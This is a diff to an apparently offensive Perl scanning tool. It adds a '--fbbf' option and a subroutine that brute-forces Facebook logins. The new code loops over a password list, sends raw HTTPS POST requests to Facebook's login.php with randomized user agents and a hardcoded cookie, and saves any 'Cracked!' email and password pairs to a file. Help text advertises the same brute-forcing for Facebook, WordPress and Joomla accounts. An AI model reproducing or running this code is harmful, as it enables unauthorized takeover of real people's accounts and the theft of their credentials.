@@ -163,6 +163,7 @@ my $password;
 my $joombf;
 my $ifinurl;
 my $noinfo;
+my $fbbf;
 
 Getopt::Long::GetOptions(\my %OPT,
                         'proxy=s' => \$proxy,
@@ -215,6 +216,7 @@ Getopt::Long::GetOptions(\my %OPT,
 						'ifinurl=s' => \$ifinurl,
                         'noinfo' => \$noinfo,
 						'unique' => \$unique,
+                        'fbbf' => \$fbbf,
 ) or advise();
 ############################################################################################################################################################################################
 ############################################################################################################################################################################################
@@ -406,7 +408,7 @@ my @CODENAME = ("No monopoly for knowledge", "Virgin!! life fuck us all", "! Lov
 ############################################################################################################################################################################################
 ## PRINT DESCLAIMER
 desclaimer();
-if ((!defined $dork) && (!defined $help) && (!defined $Target) && (!defined $rangip) && (!defined $mmd5) && (!defined $mencode64) && (!defined $checkversion) && (!defined $mdecode64)) {
+if ((!defined $dork) && (!defined $fbbf) && (!defined $help) && (!defined $Target) && (!defined $rangip) && (!defined $mmd5) && (!defined $mencode64) && (!defined $checkversion) && (!defined $mdecode64)) {
   print "\033[1;37m[ ] --------------------------------------------------------------------------- [ ]\n";
   advise2();
 }
@@ -636,7 +638,7 @@ sub scandetail {
   }
   #########################################
   #########################################
-  if ((defined $mxss) || (defined $mlfi) || (defined $madmin) || (defined $mjoomrfi) || (defined $mwpadf) || (defined $mports) || (defined $mupload) || (defined $mzip) || (defined $mmails) || (defined $joombf) || (defined $wpbf)){
+  if ((defined $mxss) || (defined $mlfi) || (defined $madmin) || (defined $mjoomrfi) || (defined $mwpadf) || (defined $mports) || (defined $mupload) || (defined $mzip) || (defined $mmails) || (defined $joombf) || (defined $wpbf) || (defined $fbbf)) {
     print "\033[1;33m[+] SCAN:: ";
     if (defined $mxss) {
       print "\033[0;36m/Xss ";
@@ -667,6 +669,9 @@ sub scandetail {
     }
 	if (defined $wpbf) {
       print "\033[0;36m/WP Brute Force ";
+    }
+    if (defined $fbbf) {
+      print "\033[0;36m/Facebook Brute Force ";
     }
 	if (defined $joombf) {
       print "\033[0;36m/Joom Brute Force ";
@@ -894,7 +899,7 @@ sub targetlist {
 ############################################################################################################################################################################################
 ## EXPLOIT LIST
 if (defined $exploit) {
-  $checkdorklist = $Bin."/exploitstxt";
+  $checkdorklist = $Bin."/exploits.txt";
   if (-e $checkdorklist){ unlink $checkdorklist};
   my $pat2 = 'inurl:|intitle:|intext:|index of|allinurl';
   my $pat3 = ",";
@@ -980,6 +985,11 @@ sub countdorkslist {
 sub countpasswordlist {
   my $lcpass = 0;
   my $file = $password;
+  if (!-e $password) {
+	print "\033[1;37m\n\033[1;37m[ ] --------------------------------------------------------------------------- [ ]\n";
+	print "\033[0;31m[!] NO $password list found!\n";
+	exit();
+  }
   open $file, "<", $file;
   $lcpass++ while <$file>;
   print "$lcpass Password(s) found in list";
@@ -3231,7 +3241,7 @@ sub BFmwpsites {
 	print "\033[0;31m[!] No Results Found!\n";
     subfin();
   }
-  if ((!defined $mjoomsites) && (!defined $mupload) && (!defined $mzip) && (!defined $command) && (!defined $mmails) && (!defined $mports) && (!defined $joombf)) {
+  if ((!defined $mjoomsites) && (!defined $mabout)) {
     exit();
   }
 }
@@ -3326,7 +3336,94 @@ sub BFmjoomsites {
 	print "\033[0;31m[!] No Results Found!\n";
     subfin();
   }
-  if ((!defined $mjoomsites) && (!defined $mupload) && (!defined $mzip) && (!defined $command) && (!defined $mmails) && (!defined $mports)) {
+  if (!defined $mabout) {
+    exit();
+  }
+}
+############################################################################################################################################################################################
+############################################################################################################################################################################################
+## BRUTE FORCE FACEBOOK
+sub fbbf {
+  use Net::SSLeay::Handle;
+  scandetail();
+  if (-e $Bin.'/scan.txt'){ unlink $Bin.'/scan.txt';}
+  testconection();
+  print "\033[1;37m[ ] --------------------------------------------------------------------------- [ ]\n[!] ";
+  timer();
+  print "STARTING BRUTE FORCE FACEBOOK SCAN ...\n";
+  print "\033[1;37m[ ] --------------------------------------------------------------------------- [ ]\n";
+  forwait();
+  open(PASS,"<$password") or die "[!] Can not find $!";
+  while(<PASS>){
+    chomp($_);
+    $_ =~ s/([^^A-Za-z0-9\-_.!~*'()])/ sprintf "%%%0x", ord $1 /eg;
+    my $a = "POST /login.php HTTP/1.1";
+    my $b = "Host: www.facebook.com";
+    my $c = "Connection: close";
+    my $e = "Cache-Control: max-age=0";
+    my $f = "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
+    my $g = "Origin: https://www.facebook.com";   #my $xh = "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31";
+    my $h = "User-Agent: Mozilla/5.0 (".$sys[int rand @sys].";) ".$vary[int rand @vary];
+    my $i = "Content-Type: application/x-www-form-urlencoded";
+    my $j = "Accept-Encoding: gzip,deflate,sdch";
+    my $k = "Accept-Language: en-US,en;q=0.8";
+    my $l = "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.3";
+    my $cookie = "cookie: datr=80ZzUfKqDOjwL8pauwqMjHTa";
+    my $post = "lsd=AVpD2t1f&display=&enable_profile_selector=&legacy_return=1&next=&profile_selector_ids=&trynum=1&timezone=300&lgnrnd=031110_Euoh&lgnjs=1366193470&email=$username&pass=$_&default_persistent=0&login=Log+In";
+    my $cl = length($post);
+    my $d = "Content-Length: $cl";
+    my ($host, $port) = ("www.facebook.com", 443);
+    tie(*SSL, "Net::SSLeay::Handle", $host, $port);
+    print SSL "$a\n";
+    print SSL "$b\n";
+    print SSL "$c\n";
+    print SSL "$d\n";
+    print SSL "$e\n";
+    print SSL "$f\n";
+    print SSL "$g\n";
+    print SSL "$h\n";
+    print SSL "$i\n";
+    print SSL "$j\n";
+    print SSL "$k\n";
+    print SSL "$l\n";
+    print SSL "$cookie\n\n";
+    print SSL "$post\n";
+    my $success;
+    while(my $result = <SSL>){
+      if($result =~ /Location(.*?)/) {
+        $success = $1;
+      }
+    }
+    print "\033[1;37m    MAIL:   ";
+    print "\033[0;37m$username\n";
+    print "\033[1;37m    PASS:   ";
+    print "\033[0;37m$_\n";
+    print "\033[1;37m    SCAN:   ";
+    if (!defined $success) {  
+      print "\033[0;31mFailed!\n";
+      close SSL;
+    }else{
+      print "\033[0;32mCracked!\n";   
+      open (LOG, '>>', $Bin.'/scan.txt');
+      print LOG "$username >> $_\n";
+      close (LOG);   
+      close SSL;
+    } 
+    print "    \033[1;37m[ ] --------------------------------------------------------------------------- \n";
+  }
+  close(PASS);
+  if (-e $Bin."/crackedfb".getlist()) {unlink $Bin."/crackedfb_".getlist();}
+  if (-e $Bin.'/scan.txt') {
+    use File::Copy qw(copy);
+    copy $Bin.'/scan.txt', $Bin."/crackedfb_".getlist();
+	fincontinuemodule();
+	print "\033[0;32m[!] Results saved in $Bin/crackedfb_".getlist()."!\n";
+	    subfin();
+  }else{
+	print "\033[0;31m[!] No Results Found!\n";
+    subfin();
+  }
+  if (!defined $mabout) {
     exit();
   }
 }
@@ -3404,8 +3501,9 @@ sub help {
   print "   --rang        | Set ip range [Ex: --rang 124.12.10.144-22.36.14.152]\n";
   print "   --wpbf        | Wordpress Login Brute Force\n";
   print "   --joombf      | Joomla Login Brute Force\n";
-  print "   --user        | Set Username Login WP/JOOM Brute Force\n";
-  print "   --pass        | Set Password List Login WP/JOOM Brute Force\n";
+  print "   --fbbf        | Facebook Login Brute Force\n";
+  print "   --user        | Set Username Login FB/WP/JOOM Brute Force\n";
+  print "   --pass        | Set Password List Login FB/WP/JOOM Brute Force\n";
   print "   --nobanner    | Hide tool banner\n";
   print "   --beep        | Produce beep sount if positive scan found.\n";
   print "   --noinfo      | Jump extra results info.\n";
@@ -3489,10 +3587,10 @@ sub help {
   print "    -t <ip> --level <10> --xss --lfi --wp..\n";
   print "    -t <targets> --xss --lfi --wp..\n\n";
   
-  print "\033[1;37m  Brute Force WP/JOOM Login: \n";
+  print "\033[1;37m  Brute Force FB/WP/JOOM Login: \n";
   print "  ......................\n";
   print "\033[0;37m";
-  print "    --dork <dork> --level <10> --wpbf/--joombf --user --pass password.txt \n\n";
+  print "    --dork <dork> --level <10> --fbbf/--wpbf/--joombf --user <user> --pass password.txt \n\n";
   
   print "\033[1;37m  Check and update: \n";
   print "  ......................\n";
@@ -3548,14 +3646,12 @@ if ((defined $dork) || (defined $Target) || (defined $rangip)) {
     }
   }
   if (((defined $replace) && (!defined $with)) || ((!defined $replace) && (defined $with))){
-    print "\033[1;37m[ ] --------------------------------------------------------------------------- [ ]\n";
-    
+    print "\033[1;37m[ ] --------------------------------------------------------------------------- [ ]\n";   
     print "\033[0;33m[!] Invalid option! [Ex: --replace <value> --with <value>]\n";
 	exit();
   }
   if (((defined $wpbf) || (defined $joombf)) && ((!defined $username) && (!defined $password))){
-    print "\033[1;37m[ ] --------------------------------------------------------------------------- [ ]\n";
-    
+    print "\033[1;37m[ ] --------------------------------------------------------------------------- [ ]\n";   
     print "\033[0;33m[!] Invalid option! [Ex: --wpbf/joombf --user <value> --pass <pass.txt>]\n";
 	exit();
   }
@@ -3620,7 +3716,7 @@ if (defined $mlevel) {
 		if (defined $mzip) { mzipsites();}
 	    if (defined $mmails) { mmails();}
 	    if (defined $wpbf) { BFmwpsites();}
-	    if (defined $joombf) { BFmjoomsites();}
+	    if (defined $joombf) { BFmjoomsites();}        
 	  }
     }
    exit();
@@ -3682,6 +3778,7 @@ if ((defined $mmd5) || (defined $mdecode64) || (defined $mencode64)) {
   }elsif (defined $mencode64) { mencode64();exit();
   }elsif (defined $mdecode64) { mdecode64();exit();}
 }
+if (defined $fbbf) { fbbf();}
 if (defined $mabout) { mabout(); exit();}
 if (defined $checkversion) { checkversion(); exit();}
 if (defined $help) { help(); exit();}
